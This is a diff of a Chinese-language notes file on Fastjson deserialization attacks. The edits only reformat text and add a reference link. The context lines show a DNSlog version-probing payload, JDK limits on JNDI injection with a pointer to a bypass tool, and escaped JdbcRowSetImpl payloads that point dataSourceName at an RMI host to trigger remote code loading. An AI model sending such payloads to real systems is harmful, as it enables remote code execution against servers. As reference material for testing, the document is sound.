@@ -306,8 +306,7 @@ Set[{"@type":"java.net.URL","val":"http://dnslog"}
 ]
 ```
 
-1.2.80 版本探测 如果收到了两个 dns 请求，则证明使用了 1.2.83 版本
-如果收到了一个 dns 请求，则证明使用了 1.2.80 版本
+1.2.80 版本探测 如果收到了两个 dns 请求，则证明使用了 1.2.83 版本如果收到了一个 dns 请求，则证明使用了 1.2.80 版本
 
 ```text
 [
@@ -708,7 +707,7 @@ public class Test {
 
 除了考虑 Fastjson 版本，还得考虑 JDK 版本，中间件版本，第三方依赖版本。
 
-JDK 版本对于 JDNI 注入的限制，基于 RMI 利用的 JDK 版本&lt;=6u141、7u131、8u121，基于 LDAP 利用的 JDK 版本&lt;=6u211、7u201、8u191。（更高版本也有绕过）<br />
+JDK 版本对于 JDNI 注入的限制，基于 RMI 利用的 JDK 版本&lt;=6u141、 7u131 、8u121，基于 LDAP 利用的 JDK 版本&lt;=6u211、 7u201 、8u191。（更高版本也有绕过）<br />
 更高版本绕过可用<https://github.com/veracode-research/rogue-jndi>
 
 1.  jndi
@@ -1528,3 +1527,8 @@ Fastjson 默认会去除键、值外的空格、=\b=、=\n=、=\r=、=\f=等，�
 
 {"\u0040\u0074\u0079\u0070\u0065":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://10.251.0.111:9999","autoCommit":true}  {"\x40\x74\x79\x70\x65":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://10.251.0.111:9999","autoCommit":true}
 ```
+
+
+## Refs {#refs}
+
+-   <https://github.com/safe6Sec/Fastjson>
